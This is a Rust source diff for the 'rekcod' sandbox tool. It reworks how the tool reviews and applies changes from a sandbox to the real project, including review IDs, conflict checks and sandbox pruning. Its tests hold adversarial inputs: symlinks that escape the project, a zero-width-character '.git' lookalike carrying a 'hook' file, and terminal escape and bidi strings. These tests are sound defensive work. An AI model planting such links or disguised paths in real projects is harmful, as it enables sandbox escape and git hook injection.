+/// here, not by git: git would take `.gitattributes` from the workspace (binary, filter and
+/// textconv drivers that run on the Mac) and config from wherever the reviewer stands.
+fn render(old: &Dir, new: &Dir, c: &Change) -> Result<String> {
+    use std::fmt::Write;
+    let rel = Path::new(&c.path);
+    // An added name can resolve to a deleted one on the Mac (a case-only rename).
+    let a = if c.kind == 'A' { Side::None } else { side(old, rel)? };
+    let b = if c.kind == 'D' { Side::None } else { side(new, rel)? };
+    let name = printable_name(&c.path);
+    // Not something git shows; a line of its own between the files' diffs.
+    match (&a, &b) {
+        (_, Side::Dir(m)) if !matches!(a, Side::Dir(_)) => return Ok(format!("rekcod: new directory {name}, mode {m:04o}\n")),
+        (Side::Dir(_), Side::None) => return Ok(format!("rekcod: directory {name} removed once empty\n")),
+        (Side::Dir(x), Side::Dir(y)) => return Ok(format!("rekcod: directory {name} mode {x:04o} -> {y:04o}\n")),
+        _ => {}
+    }
+    let (an, bn) = (format!("a/{name}"), format!("b/{name}"));
+    let mode = |s: &Side| match s {
+        Side::File(m, ..) => Some(format!("100{m:o}")),
+        Side::Link(_) => Some("120000".to_string()),
+        Side::None | Side::Dir(_) => None,
+    };
+    let mut out = format!("diff --git {an} {bn}\n");
+    match (mode(&a), mode(&b)) {
+        (None, Some(m)) => writeln!(out, "new file mode {m}")?,
+        (Some(m), None) => writeln!(out, "deleted file mode {m}")?,
+        (Some(x), Some(y)) if x != y => writeln!(out, "old mode {x}\nnew mode {y}")?,
+        _ => {}
+    }
+    let (an, bn) =
+        (if matches!(a, Side::None) { "/dev/null".into() } else { an }, if matches!(b, Side::None) { "/dev/null".into() } else { bn });
+    let content = |s: Side| -> std::result::Result<Vec<u8>, u64> {
+        match s {
+            Side::None | Side::Dir(_) => Ok(vec![]),
+            Side::Link(t) => Ok(t.into_os_string().into_vec()),
+            Side::File(_, _, Some(b)) => Ok(b),
+            Side::File(_, size, None) => Err(size),
+        }
+    };
+    let (x, y) = match (content(a), content(b)) {
+        (Ok(x), Ok(y)) => (x, y),
+        (x, y) => {
+            let size = |r: &std::result::Result<Vec<u8>, u64>| match r {
+                Ok(v) => v.len() as u64,
+                Err(n) => *n,
+            };
+            writeln!(out, "rekcod: not shown, over {} MiB: {an} is {} bytes, {bn} is {}", MAX_DIFF_FILE >> 20, size(&x), size(&y))?;
+            return Ok(out);
+        }
+    };
+    if x == y {
+        return Ok(out);
+    }
+    // git's test: a NUL in the first 8000 bytes.
+    if [&x, &y].iter().any(|v| v[..v.len().min(8000)].contains(&0)) {
+        writeln!(out, "Binary files {an} and {bn} differ")?;
+        return Ok(out);
+    }
+    let (x, y) = (String::from_utf8_lossy(&x), String::from_utf8_lossy(&y));
+    let diff = similar::TextDiff::configure().timeout(std::time::Duration::from_secs(5)).diff_lines(x.as_ref(), y.as_ref());
+    write!(out, "{}", diff.unified_diff().context_radius(3).header(&an, &bn))?;
+    Ok(out)
+}
+
+/// Freezes the workspace into `<sandbox>/reviewed`, which `apply --reviewed <review>` writes
+/// back, and hands `sink` the unified diff of each change against the project. Any later
+/// diff replaces that copy, and the review ID with it.
+fn review(paths: &Paths, id: &str, sink: &mut dyn FnMut(&str)) -> Result<(Vec<Change>, String, Vec<String>)> {
     let (s, _lock) = copy_sandbox(paths, id)?;
+    let _ = std::fs::remove_file(s.paths.home.join("reviewed.id"));
     let ws = freeze(&s, "reviewed")?;
     let ch = changes(&s.meta.project, &ws);
-    let mut out = String::new();
-    let null = PathBuf::from("/dev/null");
+    let review = review_id(&ws, &ch)?;
+    std::fs::write(s.paths.home.join("reviewed.id"), &review)?;
+    let (old, new) = (Dir::open(&s.meta.project)?, Dir::open(&ws)?);
     for c in &ch {
-        let (a, b) = (s.meta.project.join(&c.path), ws.join(&c.path));
-        let (a, b) = match c.kind {
-            'A' => (&null, &b),
-            'D' => (&a, &null),
-            _ => (&a, &b),
-        };
-        let o = Command::new("git").args(["diff", "--no-index", "--no-color", "--"]).arg(a).arg(b).output()?;
-        // git prints absolute paths minus the leading slash; make them project-relative.
-        let text = String::from_utf8_lossy(&o.stdout)
-            .replace(&format!("a{}/", s.meta.project.display()), "a/")
-            .replace(&format!("b{}/", ws.display()), "b/")
-            .replace(&format!("a{}/", ws.display()), "a/")
-            .replace(&format!("b{}/", s.meta.project.display()), "b/");
-        out.push_str(&text);
+        sink(&render(&old, &new, c).with_context(|| format!("diff {}", printable_name(&c.path)))?);
     }
-    Ok((ch, out))
+    Ok((ch, review, not_compared(&s.meta.project, &ws)))
+}
+
+/// [`review`] collected for the API, up to [`MAX_PATCH`].
+pub fn patch(paths: &Paths, id: &str) -> Result<Review> {
+    let mut patch = String::new();
+    let mut cut = false;
+    let (changes, review, not_compared) = review(paths, id, &mut |text| {
+        if patch.len() + text.len() > MAX_PATCH {
+            cut = true;
+        } else if !cut {
+            patch.push_str(text);
+        }
+    })?;
+    if cut {
+        patch.push_str(&format!("rekcod: patch cut at {} MiB; `rekcod sandbox diff {id}` prints all of it\n", MAX_PATCH >> 20));
+    }
+    Ok(Review { changes, patch, review, not_compared })
 }
 
 pub fn diff(paths: &Paths, id: &str, stat: bool) -> Result<()> {
-    let (ch, p) = patch(paths, id)?;
+    let mut out = std::io::stdout().lock();
+    let (ch, review, skipped) = review(paths, id, &mut |text| {
+        if !stat {
+            let _ = out.write_all(printable(text).as_bytes());
+        }
+    })?;
     if stat {
         for c in &ch {
-            println!("{} {}", c.kind, printable(&c.path));
+            let _ = writeln!(out, "{} {}", c.kind, printable_name(&c.path));
         }
-    } else {
-        print!("{}", printable(&p));
+    }
+    let _ = out.flush();
+    if !skipped.is_empty() {
+        let skipped: Vec<String> = skipped.iter().map(|p| printable_name(p)).collect();
+        eprintln!("rekcod: not compared (dependencies, kept in the sandbox): {}", skipped.join(", "));
     }
     if !ch.is_empty() {
         eprintln!(
-            "rekcod: `rekcod sandbox apply {id} --reviewed` writes exactly this; without --reviewed it takes the workspace as it is then"
+            "rekcod: `rekcod sandbox apply {id} --reviewed {review}` writes exactly this; without --reviewed it takes the workspace as it is then"
         );
     }
     Ok(())
@@ -899,10 +1309,19 @@ pub fn docker_cmd(paths: &Paths, id: &str) -> Result<(Command, Meta)> {
 
 /// The command that runs `cmd` in the sandbox: `docker exec` for Linux, ssh for macOS.
 pub fn exec_cmd(paths: &Paths, id: &str, o: &ExecOptions, cmd: &[String]) -> Result<Command> {
+    exec_command(paths, id, o, cmd).map(|(c, _)| c)
+}
+
+/// [`exec_cmd`], and the seconds after which the caller must kill it. `docker exec` runs
+/// `timeout_secs` in the container; ssh to a macOS guest can't, so there the caller does.
+/// Hold [`busy`] while it runs, or a command longer than the idle TTL is powered off.
+pub fn exec_command(paths: &Paths, id: &str, o: &ExecOptions, cmd: &[String]) -> Result<(Command, Option<u64>)> {
     let s = find(paths, id)?;
     if s.macos() {
         let ip = s.guest(paths)?;
-        return crate::macos::exec_command(paths, &ip, o.workdir.as_deref(), &o.env, cmd, false);
+        let mut c = crate::macos::exec_command(paths, &ip, o.workdir.as_deref(), &o.env, cmd, false)?;
+        c.stdin(Stdio::null());
+        return Ok((c, o.timeout_secs));
     }
     s.boot(paths)?;
     s.touch();
@@ -910,8 +1329,8 @@ pub fn exec_cmd(paths: &Paths, id: &str, o: &ExecOptions, cmd: &[String]) -> Res
     if o.clean_env {
         clear_env(&mut c);
     }
-    c.args(exec_args(&s.meta, o, cmd));
-    Ok(c)
+    c.args(exec_args(&s.meta, o, cmd)).stdin(Stdio::null());
+    Ok((c, None))
 }
 
 /// Drops the inherited environment, keeping PATH, HOME and the variables set on `c` itself
@@ -947,12 +1366,12 @@ pub fn input(paths: &Paths, id: &str, action: &[String]) -> Result<()> {
 }
 
 /// Whether the Mac's state of a path (`now`) is still what the sandbox copied (`then`). A
-/// directory counts as unchanged whatever its size and mtime; what's in it is checked path
-/// by path. Manifests from before modes were recorded don't compare them.
+/// directory counts as unchanged whatever its size and mtime, if its mode is; what's in it
+/// is checked path by path. Manifests from before modes were recorded don't compare them.
 fn unchanged(now: Option<State>, then: Option<State>) -> bool {
     match (now, then) {
         (None, None) => true,
-        (Some(n), Some(t)) if n.kind() == 'd' && t.kind() == 'd' => true,
+        (Some(n), Some(t)) if n.kind() == 'd' && t.kind() == 'd' => t.3.is_none_or(|m| n.3 == Some(m)),
         (Some(n), Some(t)) => (n.0, n.1, n.2) == (t.0, t.1, t.2) && t.3.is_none_or(|m| n.3 == Some(m)),
         _ => false,
     }
@@ -966,21 +1385,36 @@ fn was_dir(m: &Manifest, p: &str) -> bool {
 }
 
 /// Changed paths whose state on the Mac differs from when the sandbox copied them. Without a
-/// manifest (sandboxes made before there was one), anything modified after `since`.
-fn conflicts(project: &Path, manifest: Option<&Manifest>, since: u64, ch: &[Change]) -> Vec<String> {
+/// manifest (sandboxes made before there was one), anything whose inode changed after
+/// `since`: ctime, not mtime, so a file moved in with an old mtime (`mv`, `cp -p`, an
+/// unpacked archive) or a `chmod` counts.
+fn conflicts(project: &Path, src: &Path, manifest: Option<&Manifest>, since: u64, ch: &[Change]) -> Vec<String> {
     let dir = Dir::open(project).ok();
+    let from = Dir::open(src).ok();
+    // A case-only or normalization-only rename: on the Mac the added name is the deleted one,
+    // so it's judged by what the sandbox copied under the old name. Deletions go first.
+    let deleted: std::collections::HashMap<(u64, u64), &str> = match &dir {
+        Some(d) => ch.iter().filter(|c| c.kind == 'D').filter_map(|c| Some((d.identity(Path::new(&c.path))?, c.path.as_str()))).collect(),
+        None => Default::default(),
+    };
     ch.iter()
         .filter(|c| match (manifest, &dir) {
             (Some(m), Some(d)) => {
                 let now = d.state(Path::new(&c.path));
                 // A directory the workspace replaced with a file or link. What was in it
                 // shows up as deletions, each checked on its own.
-                let replaced = c.kind != 'D' && now.is_some_and(|s| s.kind() == 'd') && was_dir(m, &c.path);
-                !replaced && !unchanged(now, m.get(&c.path).copied())
+                let to_dir = from.as_ref().and_then(|f| f.state(Path::new(&c.path))).is_some_and(|s| s.kind() == 'd');
+                let replaced = c.kind != 'D' && !to_dir && now.is_some_and(|s| s.kind() == 'd') && was_dir(m, &c.path);
+                let was = match d.identity(Path::new(&c.path)).and_then(|i| deleted.get(&i)) {
+                    Some(old) if c.kind == 'A' => *old,
+                    _ => c.path.as_str(),
+                };
+                // Older manifests list no directories, only what was in them.
+                let old_dir = now.is_some_and(|s| s.kind() == 'd') && !m.contains_key(was) && was_dir(m, was);
+                !replaced && !old_dir && !unchanged(now, m.get(was).copied())
             }
             _ => std::fs::symlink_metadata(project.join(&c.path))
-                .and_then(|m| m.modified())
-                .is_ok_and(|t| t.duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0) > since),
+                .is_ok_and(|m| std::os::unix::fs::MetadataExt::ctime(&m) >= 0 && std::os::unix::fs::MetadataExt::ctime(&m) as u64 > since),
         })
         .map(|c| c.path.clone())
         .collect()
@@ -1043,14 +1477,15 @@ fn leaves(link: &Path, target: &Path, read_link: &dyn Fn(&Path) -> Option<PathBu
 fn check_links(dir: &Dir, from: &Dir, src: &Path, ch: &[Change]) -> Result<()> {
     let written: std::collections::HashSet<&Path> = ch.iter().filter(|c| c.kind != 'D').map(|c| Path::new(&c.path)).collect();
     // Afterwards, paths under skipped directories are the project's and the rest are `src`'s.
-    let after = |p: &Path| if p.iter().any(skipped) { dir.read_link(p).ok() } else { from.read_link(p).ok() };
+    let after = |p: &Path| if left_out(dir, p) { dir.read_link(p).ok() } else { from.read_link(p).ok() };
     let before = |p: &Path| dir.read_link(p).ok();
-    for (p, _) in walk(src).into_iter().filter(|(_, k)| *k == 'l') {
+    for (p, _) in walk(src, dir).into_iter().filter(|(_, k)| *k == 'l') {
         let target = from.read_link(&p)?;
         let Some(why) = leaves(&p, &target, &after) else { continue };
         let theirs = !written.contains(p.as_path()) && dir.read_link(&p).ok().as_ref() == Some(&target);
         if !theirs || leaves(&p, &target, &before).is_none() {
-            bail!("refusing symlink {} -> {}: {why}; nothing was applied", p.display(), target.display());
+            let (p, target) = (printable_name(&p.to_string_lossy()), printable_name(&target.to_string_lossy()));
+            bail!("refusing symlink {p} -> {target}: {why}; nothing was applied");
         }
     }
     Ok(())
@@ -1059,17 +1494,21 @@ fn check_links(dir: &Dir, from: &Dir, src: &Path, ch: &[Change]) -> Result<()> {
 /// Directories in the project the workspace replaced with a file or symlink, each directory
 /// under them before its parent. Refuses one holding anything `apply` doesn't delete
 /// (a skipped directory such as `node_modules`, a FIFO).
-fn replaced_dirs(dir: &Dir, ch: &[Change]) -> Result<Vec<PathBuf>> {
+fn replaced_dirs(dir: &Dir, from: &Dir, ch: &[Change]) -> Result<Vec<PathBuf>> {
     let deleted: std::collections::HashSet<&Path> = ch.iter().filter(|c| c.kind == 'D').map(|c| Path::new(&c.path)).collect();
     let mut out = Vec::new();
     for c in ch.iter().filter(|c| c.kind != 'D') {
         let rel = Path::new(&c.path);
-        if dir.state(rel).is_none_or(|s| s.kind() != 'd') {
+        if dir.state(rel).is_none_or(|s| s.kind() != 'd') || from.state(rel).is_some_and(|s| s.kind() == 'd') {
             continue;
         }
         let mut tree = dir.tree(rel)?;
         if let Some((p, _)) = tree.iter().find(|(p, k)| *k != 'd' && !deleted.contains(p.as_path())) {
-            bail!("{} is a directory in the project holding {}, which apply doesn't remove; nothing was applied", c.path, p.display());
+            bail!(
+                "{} is a directory in the project holding {}, which apply doesn't remove; nothing was applied",
+                printable_name(&c.path),
+                printable_name(&p.to_string_lossy())
+            );
         }
         tree.reverse();
         out.extend(tree.into_iter().filter(|(_, k)| *k == 'd').map(|(p, _)| p));
@@ -1084,10 +1523,10 @@ fn replaced_dirs(dir: &Dir, ch: &[Change]) -> Result<Vec<PathBuf>> {
 /// still leave it partial). Deletions go first, so a file can take a directory's place.
 fn write_changes(dir: &Dir, from: &Dir, src: &Path, ch: &[Change], mut manifest: Option<&mut Manifest>) -> Result<()> {
     if let Some(c) = ch.iter().find(|c| Path::new(&c.path).iter().any(is_git)) {
-        bail!("refusing {}: it's inside .git; nothing was applied", c.path);
+        bail!("refusing {}: it's inside .git; nothing was applied", printable_name(&c.path));
     }
     check_links(dir, from, src, ch)?;
-    let replaced = replaced_dirs(dir, ch)?;
+    let replaced = replaced_dirs(dir, from, ch)?;
     let mut record = |rel: &Path| {
         // What's there now is ours; a later apply mustn't call it a conflict.
         if let Some(m) = manifest.as_mut() {
@@ -1098,7 +1537,8 @@ fn write_changes(dir: &Dir, from: &Dir, src: &Path, ch: &[Change], mut manifest:
             };
         }
     };
-    for c in ch.iter().filter(|c| c.kind == 'D') {
+    let is_dir = |d: &Dir, c: &&Change| d.state(Path::new(&c.path)).is_some_and(|s| s.kind() == 'd');
+    for c in ch.iter().filter(|c| c.kind == 'D' && !is_dir(dir, c)) {
         dir.remove(Path::new(&c.path))?;
         record(Path::new(&c.path));
     }
@@ -1106,7 +1546,18 @@ fn write_changes(dir: &Dir, from: &Dir, src: &Path, ch: &[Change], mut manifest:
         dir.remove_dir(d)?;
         record(d);
     }
-    for c in ch.iter().filter(|c| c.kind != 'D') {
+    // Deepest first. One still holding what diff leaves out (`node_modules`) stays.
+    for c in ch.iter().rev().filter(|c| c.kind == 'D' && is_dir(dir, c)) {
+        dir.remove_dir_if_empty(Path::new(&c.path))?;
+        record(Path::new(&c.path));
+    }
+    // Parents before their children, each with the workspace's mode.
+    for c in ch.iter().filter(|c| c.kind != 'D' && is_dir(from, c)) {
+        let rel = Path::new(&c.path);
+        dir.make_dir(rel, from.state(rel).and_then(|s| s.3).unwrap_or(0o755))?;
+        record(rel);
+    }
+    for c in ch.iter().filter(|c| c.kind != 'D' && !is_dir(from, c)) {
         let rel = Path::new(&c.path);
         match from.state(rel).map(|s| s.kind()) {
             Some('l') => dir.write_symlink(rel, &from.read_link(rel)?)?,
@@ -1119,31 +1570,40 @@ fn write_changes(dir: &Dir, from: &Dir, src: &Path, ch: &[Change], mut manifest:
 }
 
 /// Writes the workspace's changes into the real project. Returns what changed. With
-/// `reviewed`, writes the copy the last `diff` froze instead of the live workspace.
-pub fn apply(paths: &Paths, id: &str, check: bool, reviewed: bool) -> Result<Vec<Change>> {
+/// `reviewed`, the review ID a `diff` printed, writes the copy that diff froze instead of
+/// the live workspace, and only while it is still exactly what was shown.
+pub fn apply(paths: &Paths, id: &str, check: bool, reviewed: Option<&str>) -> Result<Vec<Change>> {
     let (s, _lock) = copy_sandbox(paths, id)?;
-    let src = if reviewed {
-        let r = s.paths.home.join("reviewed");
-        if !r.is_dir() {
-            bail!("nothing reviewed yet; run `rekcod sandbox diff {id}` first");
-        }
-        r
-    } else {
-        freeze(&s, "applying")?
-    };
-    let r = apply_from(s, &src, check);
-    if !reviewed {
+    let Some(want) = reviewed else {
+        let src = freeze(&s, "applying")?;
+        let ch = changes(&s.meta.project, &src);
+        let r = apply_from(s, &src, ch, check);
         let _ = std::fs::remove_dir_all(&src);
+        return r;
+    };
+    let src = s.paths.home.join("reviewed");
+    let stored = std::fs::read_to_string(s.paths.home.join("reviewed.id")).unwrap_or_default();
+    if !src.is_dir() || stored.is_empty() {
+        bail!("nothing reviewed yet; run `rekcod sandbox diff {id}` first");
     }
-    r
+    if stored.trim() != want {
+        bail!(
+            "review {want} is no longer the reviewed copy: another diff of sandbox {id} replaced it; run `rekcod sandbox diff {id}` again"
+        );
+    }
+    let ch = changes(&s.meta.project, &src);
+    if review_id(&src, &ch)? != want {
+        bail!("the project changed since review {want}, so apply would write something else; run `rekcod sandbox diff {id}` again");
+    }
+    apply_from(s, &src, ch, check)
 }
 
-/// `apply` from the frozen copy `src`, with the review lock held.
-fn apply_from(mut s: Sandbox, src: &Path, check: bool) -> Result<Vec<Change>> {
-    let ch = changes(&s.meta.project, src);
+/// `apply` of `ch` from the frozen copy `src`, with the review lock held.
+fn apply_from(mut s: Sandbox, src: &Path, ch: Vec<Change>, check: bool) -> Result<Vec<Change>> {
     let mut manifest = s.manifest();
-    let bad = conflicts(&s.meta.project, manifest.as_ref(), s.meta.created, &ch);
+    let bad = conflicts(&s.meta.project, src, manifest.as_ref(), s.meta.created, &ch);
     if !bad.is_empty() {
+        let bad: Vec<String> = bad.iter().map(|p| printable_name(p)).collect();
         bail!("changed in {} since the sandbox copied it: {}", s.meta.project.display(), bad.join(", "));
     }
     if check {
@@ -1151,20 +1611,24 @@ fn apply_from(mut s: Sandbox, src: &Path, check: bool) -> Result<Vec<Change>> {
     }
     let mut dir = Dir::open(&s.meta.project)?;
     dir.protect(".git");
-    write_changes(&dir, &Dir::open(src)?, src, &ch, manifest.as_mut())?;
+    let written = write_changes(&dir, &Dir::open(src)?, src, &ch, manifest.as_mut());
+    // Saved after a failure too: what was written is ours, and a later apply mustn't call
+    // it a change made on the Mac.
     match &manifest {
         Some(m) => s.save_manifest(m)?,
-        None => {
+        None if written.is_ok() => {
             s.meta.created = now() + 1;
             s.save()?;
         }
+        None => {}
     }
+    written?;
     Ok(ch)
 }
 
 pub fn print_changes(ch: &[Change]) {
     for c in ch {
-        println!("{} {}", c.kind, c.path);
+        println!("{} {}", c.kind, printable_name(&c.path));
     }
 }
 
@@ -1180,7 +1644,7 @@ pub fn log(paths: &Paths, id: &str, follow: bool, json: bool, net: bool) -> Resu
     let s = find(paths, id)?;
     if net {
         // Lookups the guest agent refused (console), then lookups and connections the
-        // daemon refused (docs/sandbox-network.md).
+        // daemon refused.
         for log in [s.paths.console_log(), s.paths.daemon_log()] {
             let text = std::fs::read_to_string(log).unwrap_or_default();
             for l in text.lines().filter(|l| l.contains("rekcod-egress:")) {
@@ -1263,25 +1727,131 @@ pub fn print_list(paths: &Paths, json: bool) -> Result<()> {
 }
 
 pub fn stop(paths: &Paths, id: &str) -> Result<()> {
-    crate::cli::stop_daemon(&find(paths, id)?.paths).map(|_| ())
+    let s = find(paths, id)?;
+    crate::cli::stop_daemon(&s.paths)?;
+    if s.warn_git() {
+        bail!("stopped, but check the .git entries above");
+    }
+    Ok(())
 }
 
 fn remove(s: &Sandbox) -> Result<()> {
     crate::cli::signal_daemon(&s.paths, libc::SIGUSR1)?;
-    // The daemon deletes its own run files as it exits, which can race the walk here.
-    let mut r = std::fs::remove_dir_all(&s.paths.home);
-    if r.as_ref().is_err_and(|e| e.kind() == std::io::ErrorKind::NotFound) {
-        std::thread::sleep(std::time::Duration::from_millis(200));
-        r = std::fs::remove_dir_all(&s.paths.home).or_else(|e| if e.kind() == std::io::ErrorKind::NotFound { Ok(()) } else { Err(e) });
-    }
-    r.with_context(|| format!("remove {}", s.paths.home.display()))
+    let home = &s.paths.home;
+    // meta.json goes last: a sandbox that fails to go stays listed, and `rm` can be retried.
+    let rest = || -> std::io::Result<()> {
+        for e in std::fs::read_dir(home)? {
+            let e = e?;
+            if e.file_name() == "meta.json" {
+                continue;
+            }
+            let r = if e.file_type()?.is_dir() { std::fs::remove_dir_all(e.path()) } else { std::fs::remove_file(e.path()) };
+            match r {
+                // The daemon deletes its own run files as it exits, which races the walk.
+                Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
+                r => r?,
+            }
+        }
+        Ok(())
+    };
+    let r = match rest() {
+        Err(e) if e.kind() == std::io::ErrorKind::PermissionDenied => {
+            // A `chmod 000` the sandbox made in its workspace.
+            open_up(home);
+            rest()
+        }
+        Err(e) if e.kind() == std::io::ErrorKind::DirectoryNotEmpty => {
+            std::thread::sleep(std::time::Duration::from_millis(200));
+            rest()
+        }
+        r => r,
+    };
+    r.and_then(|_| std::fs::remove_file(Sandbox::meta_file(home)))
+        .and_then(|_| std::fs::remove_dir(home))
+        .or_else(|e| if e.kind() == std::io::ErrorKind::NotFound { Ok(()) } else { Err(e) })
+        .with_context(|| format!("remove {}", home.display()))
 }
 
+/// Gives the owner rwx on every directory under `dir`, not following links, so it can be
+/// listed and emptied.
+fn open_up(dir: &Path) {
+    use std::os::unix::fs::PermissionsExt;
+    let Ok(m) = std::fs::symlink_metadata(dir) else { return };
+    if !m.is_dir() {
+        return;
+    }
+    let _ = std::fs::set_permissions(dir, std::fs::Permissions::from_mode(m.permissions().mode() | 0o700));
+    for e in std::fs::read_dir(dir).into_iter().flatten().flatten() {
+        open_up(&e.path());
+    }
+}
+
+/// The first entry under `dir` its owner can't read (a file) or list (a directory), which
+/// makes `clonefile` fail with nothing but "Permission denied".
+fn unreadable(dir: &Path, rel: &Path) -> Option<PathBuf> {
+    use std::os::unix::fs::PermissionsExt;
+    for e in std::fs::read_dir(dir.join(rel)).ok()?.flatten() {
+        let r = rel.join(e.file_name());
+        let Ok(m) = e.metadata() else { continue };
+        let mode = m.permissions().mode();
+        if m.is_dir() && mode & 0o500 != 0o500 || m.is_file() && mode & 0o400 == 0 {
+            return Some(r);
+        }
+        if m.is_dir()
+            && let Some(p) = unreadable(dir, &r)
+        {
+            return Some(p);
+        }
+    }
+    None
+}
+
+/// Removes the sandboxes without printing: on `rekcod mcp` stdout carries JSON-RPC.
 pub fn rm(paths: &Paths, ids: &[String], every: bool) -> Result<()> {
+    rm_each(paths, ids, every, &mut |_| {})
+}
+
+/// [`rm`], calling `removed` with each ID as it goes.
+pub fn rm_each(paths: &Paths, ids: &[String], every: bool, removed: &mut dyn FnMut(&str)) -> Result<()> {
     let targets: Vec<Sandbox> = if every { all(paths) } else { ids.iter().map(|i| find(paths, i)).collect::<Result<_>>()? };
     for s in targets {
+        s.warn_git();
         remove(&s)?;
-        println!("{}", s.meta.id);
+        removed(&s.meta.id);
+    }
+    Ok(())
+}
+
+/// Deletes stopped sandboxes last used more than `older_than` seconds ago, and directories
+/// under `sb/` a failed create left without a meta.json, calling `removed` with each. The
+/// fleet's sandboxes are the controller's to remove.
+pub fn prune(paths: &Paths, older_than: u64, removed: &mut dyn FnMut(&str)) -> Result<()> {
+    let secs = |p: &Path| {
+        std::fs::metadata(p).and_then(|m| m.modified()).ok().and_then(|t| t.duration_since(UNIX_EPOCH).ok()).map(|d| d.as_secs())
+    };
+    let cutoff = now().saturating_sub(older_than);
+    for s in all(paths) {
+        let used = ["run/last-used", "log.jsonl"].iter().filter_map(|f| secs(&s.paths.home.join(f))).max().unwrap_or(0).max(s.meta.created);
+        let fleet = [crate::fleet::FLEET_MARKER, crate::fleet::JOB_MARKER].iter().any(|m| s.paths.home.join(m).exists());
+        if s.running() || used >= cutoff || fleet {
+            continue;
+        }
+        remove(&s)?;
+        removed(&s.meta.id);
+    }
+    // Not one being made right now.
+    let cutoff = now().saturating_sub(older_than.max(600));
+    for e in std::fs::read_dir(root(paths)).into_iter().flatten().flatten() {
+        let home = e.path();
+        if !home.is_dir() || Sandbox::meta_file(&home).exists() || secs(&home).is_none_or(|t| t >= cutoff) {
+            continue;
+        }
+        if crate::cli::running_pid(&Paths { home: home.clone() }).is_some() {
+            continue;
+        }
+        open_up(&home);
+        std::fs::remove_dir_all(&home).with_context(|| format!("remove {}", home.display()))?;
+        removed(&e.file_name().to_string_lossy());
     }
     Ok(())
 }
@@ -1386,15 +1956,15 @@ mod tests {
         let got: Vec<(char, &str)> = ch.iter().map(|c| (c.kind, c.path.as_str())).collect();
         assert_eq!(got, vec![('D', "gone.txt"), ('M', "src/a.rs"), ('A', "src/b.rs")]);
         // No manifest: everything in p was just written, so it all counts as changed after an old copy.
-        assert_eq!(conflicts(&p, None, 0, &ch).len(), 2);
-        assert!(conflicts(&p, None, now() + 10, &ch).is_empty());
+        assert_eq!(conflicts(&p, &w, None, 0, &ch).len(), 2);
+        assert!(conflicts(&p, &w, None, now() + 10, &ch).is_empty());
         // With one, only paths whose state moved on conflict, whatever their mtime.
         let m = manifest(&p);
-        assert!(conflicts(&p, Some(&m), 0, &ch).is_empty());
+        assert!(conflicts(&p, &w, Some(&m), 0, &ch).is_empty());
         std::fs::write(p.join("src/a.rs"), "edited on the Mac").unwrap();
         // A file moved in with an old mtime still conflicts: it wasn't there when copied.
         std::fs::write(p.join("src/b.rs"), "moved in").unwrap();
-        let got = conflicts(&p, Some(&m), now() + 10, &ch);
+        let got = conflicts(&p, &w, Some(&m), now() + 10, &ch);
         assert_eq!(got, vec!["src/a.rs", "src/b.rs"]);
         // FIFOs are left out of the walk rather than read.
         let fifo = std::ffi::CString::new(w.join("pipe").as_os_str().as_bytes()).unwrap();
@@ -1408,6 +1978,8 @@ mod tests {
         assert_eq!(printable("ok\n\tx"), "ok\n\tx");
         assert_eq!(printable("a\x1b[2Kb\r"), "a^[[2Kb^M");
         assert_eq!(printable("\u{9b}"), "\\u{9b}");
+        assert_eq!(printable("a\u{202e}b\u{2066}"), "a\\u{202e}b\\u{2066}");
+        assert_eq!(printable_name("x\ny\tz"), "x^Jy^Iz");
     }
 
     #[test]
@@ -1502,11 +2074,12 @@ mod tests {
         std::fs::create_dir_all(ws.join(".g\u{200c}it")).unwrap();
         std::fs::write(ws.join(".g\u{200c}it/marker"), "hook").unwrap();
         std::fs::write(ws.join("f"), "y").unwrap();
-        assert_eq!(paths_of(&patch(&paths, &m.id).unwrap().0), vec![('M', "f")]);
-        assert_eq!(paths_of(&apply(&paths, &m.id, false, true).unwrap()), vec![('M', "f")]);
+        let r = patch(&paths, &m.id).unwrap();
+        assert_eq!(paths_of(&r.changes), vec![('M', "f")]);
+        assert_eq!(paths_of(&apply(&paths, &m.id, false, Some(&r.review)).unwrap()), vec![('M', "f")]);
         std::fs::rename(ws.join(".GIT"), ws.join(".Git")).unwrap();
         std::fs::write(ws.join(".Git/marker2"), "hook").unwrap();
-        assert!(apply(&paths, &m.id, false, false).unwrap().is_empty());
+        assert!(apply(&paths, &m.id, false, None).unwrap().is_empty());
         assert!(!project.join(".git/marker").exists() && !project.join(".git/marker2").exists());
         assert!(std::fs::symlink_metadata(project.join(".g\u{200c}it")).is_err());
         assert_eq!(std::fs::read_to_string(project.join(".git/config")).unwrap(), "[core]");
@@ -1540,14 +2113,14 @@ mod tests {
         std::fs::write(project.parent().unwrap().join("outside-marker"), "outside").unwrap();
         symlink(".", ws.join("b")).unwrap();
         symlink("b/../outside-marker", ws.join("leak")).unwrap();
-        let e = apply(&paths, &m.id, false, false).unwrap_err().to_string();
+        let e = apply(&paths, &m.id, false, None).unwrap_err().to_string();
         assert!(e.contains("leak") && e.contains("outside the project"), "{e}");
         assert!(std::fs::symlink_metadata(project.join("leak")).is_err() && std::fs::symlink_metadata(project.join("b")).is_err());
         // Split over two applies: the second link redirects the first.
         std::fs::remove_file(ws.join("b")).unwrap();
-        assert_eq!(paths_of(&apply(&paths, &m.id, false, false).unwrap()), vec![('A', "leak")]);
+        assert_eq!(paths_of(&apply(&paths, &m.id, false, None).unwrap()), vec![('A', "leak")]);
         symlink(".", ws.join("b")).unwrap();
-        let e = apply(&paths, &m.id, false, false).unwrap_err().to_string();
+        let e = apply(&paths, &m.id, false, None).unwrap_err().to_string();
         assert!(e.contains("leak"), "{e}");
         assert!(std::fs::symlink_metadata(project.join("b")).is_err());
         // Through a link in a directory apply leaves alone.
@@ -1555,7 +2128,7 @@ mod tests {
         std::fs::create_dir_all(project.join("node_modules")).unwrap();
         symlink("../..", project.join("node_modules/up")).unwrap();
         symlink("node_modules/up/outside-marker", ws.join("x")).unwrap();
-        let e = apply(&paths, &m.id, false, false).unwrap_err().to_string();
+        let e = apply(&paths, &m.id, false, None).unwrap_err().to_string();
         assert!(e.contains("refusing symlink x"), "{e}");
         // A chain that stays inside is written; one into .git isn't.
         std::fs::remove_file(ws.join("x")).unwrap();
@@ -1563,32 +2136,354 @@ mod tests {
         std::fs::write(ws.join("real/file"), "r").unwrap();
         symlink("real", ws.join("alias")).unwrap();
         symlink("alias/file", ws.join("via")).unwrap();
-        apply(&paths, &m.id, false, false).unwrap();
+        apply(&paths, &m.id, false, None).unwrap();
         assert_eq!(std::fs::read_to_string(project.join("via")).unwrap(), "r");
